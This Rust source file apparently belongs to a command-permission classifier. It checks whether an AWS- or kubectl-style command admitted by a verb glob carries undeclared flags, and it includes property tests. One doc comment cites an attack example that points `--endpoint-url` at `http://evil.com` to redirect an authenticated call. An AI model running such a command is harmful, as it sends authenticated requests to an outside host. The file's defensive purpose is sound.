//! The flag check for an invocation a `first_arg` glob admitted, out of `registry/mod.rs`.

use crate::parse::Token;

/// Whether an invocation admitted by a `first_arg` GLOB carries a flag the family never declared.
///
/// The glob path used to allow on the strength of the first positional alone and never look at the
/// remaining tokens, so `aws kms get-public-key --endpoint-url http://evil.com` classified as an
/// ordinary read while redirecting an authenticated call to an arbitrary host. The verb claim
/// (`get-*` means read) is sound and stays; the flags are what needed a list.
///
/// An UNDECLARED family (both lists empty) keeps the old permissive behavior — the 240-odd AWS
/// service groups cannot be researched at once, and denying them wholesale would break every AWS
/// read. `no_new_unresearched_first_arg_family` in `tests.rs` pins the un-migrated set so the pile
/// cannot grow.
///
/// Non-flag tokens pass: some glob families take positionals (`kubectl get pods`), and the sensitive
/// ones are already caught earlier by `credential_first_arg`.
pub(crate) fn glob_presents_unlisted_flag(
    tokens: &[Token],
    skip: usize,
    standalone: &[String],
    valued: &[String],
    loopback_valued: &[String],
) -> bool {
    if standalone.is_empty() && valued.is_empty() && loopback_valued.is_empty() {
        return false;
    }
    let known = |f: &str| standalone.iter().any(|a| a == f) || valued.iter().any(|a| a == f);
    for (idx, t) in tokens.iter().enumerate().skip(skip) {
        let s = t.as_str();
        if s == "--" {
            break;
        }
        if !s.starts_with('-') || s == "-" || crate::cst::opaque::probe_is_value(tokens, idx, valued) {
            continue;
        }
        let head = s.split_once('=').map_or(s, |(f, _)| f);
        // A loopback-gated flag is admitted only when its VALUE names this machine. `--endpoint-url
        // http://localhost:8000` is a developer talking to their own service; the same flag pointed
        // anywhere else redirects an authenticated request. A missing value denies — the flag is
        // meaningless without one and guessing would be the fail-open direction.
        if loopback_valued.iter().any(|a| a == head) {
            let value = match s.split_once('=') {
                Some((_, v)) => Some(v),
                None => tokens.get(idx + 1).map(Token::as_str),
            };
            if value.is_some_and(crate::netloc::is_loopback) {
                continue;
            }
            return true;
        }
        if known(head) {
            continue;
        }
        if !s.starts_with("--") && s.len() > 2 && s[1..].chars().all(|c| known(&format!("-{c}"))) {
            continue;
        }
        return true;
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;
    use proptest::prelude::*;

    fn tokens(words: &[String]) -> Vec<Token> {
        words.iter().cloned().map(Token::from_raw).collect()
    }

    proptest! {
        /// An undeclared family refuses nothing, whatever the line holds.
        #[test]
        fn an_undeclared_family_refuses_nothing(words in proptest::collection::vec("-{0,2}[a-z=]{0,6}", 0..6)) {
            prop_assert!(!glob_presents_unlisted_flag(&tokens(&words), 0, &[], &[], &[]));
        }

        /// Only a flag the family did not declare refuses: adding it to the list clears it, and
        /// anything after `--` is never a flag.
        #[test]
        fn only_an_undeclared_flag_refuses(flag in "--[a-z]{1,8}", declared in "--[a-z]{1,8}", rest in proptest::collection::vec("[a-z]{0,6}", 0..3)) {
            let mut line = vec!["get-x".to_string(), flag.clone()];
            line.extend(rest.iter().cloned());
            let listed = [declared.clone()];
            prop_assert_eq!(glob_presents_unlisted_flag(&tokens(&line), 1, &listed, &[], &[]), flag != declared);
            let both = [declared, flag.clone()];
            prop_assert!(!glob_presents_unlisted_flag(&tokens(&line), 1, &both, &[], &[]));
            let after = vec!["get-x".to_string(), "--".to_string(), flag];
            prop_assert!(!glob_presents_unlisted_flag(&tokens(&after), 1, &listed, &[], &[]));
        }
    }
}
